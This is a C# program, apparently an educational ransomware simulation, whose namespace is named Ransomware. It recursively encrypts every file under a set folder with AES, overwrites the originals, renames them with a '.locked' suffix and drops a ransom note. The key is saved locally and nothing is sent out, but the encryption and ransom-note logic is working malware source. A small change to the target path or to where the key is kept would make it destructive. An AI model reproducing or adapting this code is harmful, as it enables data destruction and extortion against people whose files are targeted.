using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Ransomware
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string targetFolder = @"C:\Ransomware"; // Simulated victim folder
            string keyPath = Path.Combine(targetFolder, "encryption.key");

            using (Aes aes = Aes.Create())
            {
                aes.GenerateKey();
                aes.GenerateIV();

                // Save key and IV
                File.WriteAllBytes(keyPath, Combine(aes.Key, aes.IV));

                EncryptFolder(targetFolder, aes);

                // Drop ransom note
                File.WriteAllText(Path.Combine(targetFolder, "READ_ME.txt"),
                    "Your files have been encrypted.\nContact fakemail@domain.com to recover them.\n[This is a simulation for educational purposes.]");

                Console.WriteLine("Simulation complete. Files encrypted and ransom note created.");
                Console.ReadLine();
            }
        }

        static void EncryptFolder(string folder, Aes aes)
        {
            foreach (string file in Directory.GetFiles(folder))
            {
                if (file.EndsWith(".exe") || file.EndsWith(".key") || file.EndsWith("READ_ME.txt"))
                    continue; // Skip system and internal files

                byte[] content = File.ReadAllBytes(file);
                byte[] encrypted;

                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                {
                    encrypted = encryptor.TransformFinalBlock(content, 0, content.Length);
                }

                File.WriteAllBytes(file, encrypted);

                // Rename file to simulate encryption
                string newFileName = file + ".locked";
                File.Move(file, newFileName);
                Console.WriteLine("Encrypted: " + Path.GetFileName(newFileName));
            }

            // Recurse into subdirectories
            foreach (string subDir in Directory.GetDirectories(folder))
            {
                EncryptFolder(subDir, aes);
            }
        }

        static byte[] Combine(byte[] key, byte[] iv)
        {
            byte[] result = new byte[key.Length + iv.Length];
            Buffer.BlockCopy(key, 0, result, 0, key.Length);
            Buffer.BlockCopy(iv, 0, result, key.Length, iv.Length);
            return result;
        }
    }
}
